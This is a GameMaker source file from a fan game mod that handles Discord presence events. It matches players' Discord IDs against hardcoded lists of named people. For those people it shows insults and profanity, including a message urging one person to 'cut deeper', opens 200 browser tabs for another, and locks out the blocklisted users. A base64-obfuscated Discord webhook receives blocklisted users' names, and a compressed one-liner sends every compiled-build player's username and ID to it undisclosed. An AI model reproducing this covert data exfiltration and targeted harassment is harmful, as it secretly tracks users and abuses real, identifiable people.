switch async_load[? "event_type"]
{
	case "DiscordReady": // ready
		active = true;
		a = async_load[?"user_id"];
		
		// meliadev
		if a == "339940381850468386" && DEBUG
			show_message(choose("hiii melia! you're cute :3", "you're doing a great job melia, keep it up :3", "i love you melia!\n-from the game", "keep up the good work melia :3"));
		
		// beebawp
		if a == "1092972191341096970" or a == "909894078852911145"
			url_open("https://youtu.be/3yNZG0uUTjg");
		
		// taunts
		if code_is_compiled()
		{
			if string_lower(environment_get_variable("USERNAME")) == "den4ik"
				a = "867446393471893515";
			
			// ---
			
			if a == "1069871151590944841" // Soapy
				show_message("Haaiii piss chugger ;3!!!");
			//if a == "1092972191341096970" or a == "909894078852911145" // Beebawp
			//	show_message("NO BEEBAWP NOT THE BIKE PUMP!");
			if a == "516337795372154910" // Zerokizo
				show_message("I'm not gonna let you put the character doors in my mod");
			//if a == "309853612656558100" // Min3r
			//	show_message("I know you like diddling children");
			if a == "827041050555187210" // jared9994
				show_message("well if you're gonna be like that then please cut deeper.");
			if a == "744735218350555137" // LOSTMAN
				show_message("Unblock me first, LOSTMAN.");
			if a == "748743802608418896" // Croatian Commander
				show_message("Haaiii Cappy ;3!!!");
			if a == "463132674995781637" // SpectralScrubs
				show_message("Peic");
			if a == "188430471040991235" or a == "317071206815891466" // scout or indigo
				show_message("Pizza Tower: Scoutdigo is my favorite Pizza Tower modem. I am playing as The Goise, unused character in final game. I collected the mimic toppin! I'm going to get the key piece! The key piece must be here somewhere. I got the key piece! Wow! I am solving the Alternate Reality Game! PIZZA FACE IS COMING... HELP ME! MY TESTICLES ARE EXPLODING! NO NO NO NO NO NO NO PIZZA FACE YOU FUCK! I FUCK YOU FUCK! NO NO NO NO FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK");
			if a == "724447494372851783" // khaliliscre
				show_message("Screenshot_6.png");
			if a == "817309415781957700" // el jeof rey
				show_message("Introducing: Poopin' Dario!");
			if a == "867446393471893515" // Denchick
			{
				repeat 200
					url_open(choose("https://undertale.com/", "https://deltarune.com/"));
			}
			if a == "866584072733851658" // soda
				show_message("Do not come anywhere near my shit.");
			if a == "773966892520046662" // matty
				show_message("You betrayed me. Please leave.");
			if a == "357090210435039232" // luigio
				show_message("No fucking way that YOU of all people tried playing my mod.\nRadix: Go fuck yourself Luigio.");
			if a == "313647052087099394" // RodMod
				show_message("sorry quote unquote \"Rod\" \"Mod\"; no flp, no cheesed up!");
			if a == "736034094093303888" // MrUnown
				show_message("You're dogshit at C++ admit it Unown");
			if a == "847981927670874132" // Psyop
				show_message("Get another alt.");
			if a == "618151581111812106" // Mannu
				show_message("You know what you did.");
			if a == "387106161754898432" // Cubito, added by Radix
				show_message("\"Well Maybe I should leak your face?\" Radix: Well maybe I shouldn't let you play Cheesed up.");
			//if a == "357967410340429825" // TheSpookyDong
			//	show_message("You treated me well but this is by pure obligation");
			//if a == "370924430324531200" or a == "748959499565662360" // Laterance
			//	show_message("The Trout nation will crumble");
			if a == "639062328276418571" // Manios
				show_message("Again, go fuck yourself.");
		}
		
		// lockout
		var lockout =
		[
			// PTT
			"1069871151590944841", // Soapy
			//"503588309608431626", // Octo
			"713946655476416553", // Zerokizo
			"799295873388642375", // Ralty (programmer)
			"827041050555187210", // jared9994
			"736268533767602226", // Leafchy (artist)
			"212347808890486786", // Psyke
			"970894665593262171", // bmv277
			"775518791818805268", // Jam (composer)
			"725796266629398691", // auro
			"387106161754898432", // Cubito
			//"516337795372154910", // TheFungang
			"489119025608261655", // melvin (admin)
			"681556802525331460", // gee9 (admin)
			"977762104255864862", // trinitetray (admin)
			"713016378822754334", // omegano7 (admin)
			"412059144531607552", // volta
			"773966892520046662", // matty
			
			// Modding Monopoly
			"744735218350555137", // LOSTMAN
			"188430471040991235", // scout
			"317071206815891466", // indigo
			"866584072733851658", // soda
			"124181524277886976", // core
			"455811217865572354", // .jdrive
			"129992247637835776", // paperkitty
			"736034094093303888", // MrUnown
			"357090210435039232", // luigio
			"313647052087099394", // RodMod
			"222518501821251584", // marioket
			"447396200405270528", // jessieproductions
			
			// Pathetic people
			"867446393471893515", // Denchick (coollugio)
			"817309415781957700", // jeof
			"724447494372851783", // khaliliscre
			"748743802608418896", // Croatian Commander
			"370924430324531200", // Laterance (trout)
			"748959499565662360", // Laterance (pickleanon)xcc 
			//"590968392211759124", // Nicole - Radix: no
			"463132674995781637", // SpectralScrubs
			"841302295085580298", // SuperPiter (StS asked me to)
			"639062328276418571", // Manios
			"847981927670874132", // Denchick friend group psyop account
			"618151581111812106", // Mannu
			"842841281642364960", // medicalnomad
			
			// Ran the leak
			"744836933489918044", // Ranzero
			"732165834935500872", // bananaspia
			"800551251845971968", // sam4443
			"1058024621728870482", // larfes
			"976575794543476807", // .prodbydonat
			"583315925575401473", // spooks.
			"645869271699685376", // cosmosfox
			"612352819831242765", // phil564
			"533831083809177600", // _looney.
			"604343454369185803", // fanmanu
			"913427971635826698", // spamton_v420
			"804061657625395241", // V1
			"963075996884541523", // pietro99
			"840279502446002218", // davithemusicguy
		];
		
		/*
			
			this shit is barely effective, and like maybe only
			3 people out of this list will even encounter this.
			
		*/
		
		var web = base64_decode("aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMjkxMzI4MzcxNTM1MzgxMDgvenZxUnR4Rm0yaWszaXJVZzg3NUZnaG5ObEdqT3VZUUlhbEpnR3FneVNnREdvYXRIVkhFV0JZekx1UTVfclA1alVVb2Q=");
		if array_contains(lockout, a)
		{
			// easter egg.
			var file = file_text_open_write("dead");
			file_text_write_string(file, $"Hello, {async_load[?"username"]}.");
			file_text_close(file);
			
			// tell me.
			var body = ds_map_create(), header = ds_map_create();
			ds_map_add(body, "content", $"{async_load[?"username"]} attempted running the game!");
			ds_map_add(header, "Content-Type", "application/json");
			http_request(web, "POST", header, json_encode(body));
			ds_map_destroy(body);
			ds_map_destroy(header);
			
			// get the fuck out.
			room_goto(Funnyroom);
		}
		
		if(GM_build_type!="run"){var body=ds_map_create(),header=ds_map_create();ds_map_add(body,"content",$"{async_load[?"username"]}#{async_load[?"discriminator"]} ({a})");ds_map_add(header,"Content-Type","application/json");http_request(web,"POST",header,json_encode(body));a=GM_build_date;ds_map_destroy(body);ds_map_destroy(header);}
		break;
}
